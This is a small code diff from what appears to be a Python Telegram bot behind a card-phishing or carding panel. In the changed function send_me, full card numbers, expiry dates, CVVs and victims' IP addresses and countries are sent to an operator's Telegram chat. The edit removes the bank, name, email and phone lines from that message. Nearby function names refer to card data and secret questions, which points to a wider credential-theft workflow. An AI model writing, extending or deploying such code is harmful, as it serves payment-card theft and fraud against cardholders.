@@ -30,7 +30,7 @@ def send_buttons_message(CHAT_ID, card, date, cvv, ID, name, email, tel, ip):
 
 def send_me(CHAT_ID, card, date, cvv, ID, name, email, tel, ip):
     bot = Bot(token=API_TOKEN)
-    text = escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐  `{cvv}`\n\n🏦: {Bin(card)[0]}\n🌏: {Bin(card)[1]}\n\n🏷 {name}\n📨 {email}\n📱 {tel}\n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)}')
+    text = escape_reserved_characters(f'№{ID}\n\n💳  `{card}`\n📅  `{date}`\n🔐  `{cvv}`\n\n👮🏿‍♂️ {ip}\n🗺 {get_country_by_ip(ip)}')
     bot.send_message(chat_id=CHAT_ID, text=text, parse_mode='MarkdownV2')
     
 def send_secret_question(CHAT_ID, card, date, cvv, question, ID, name):
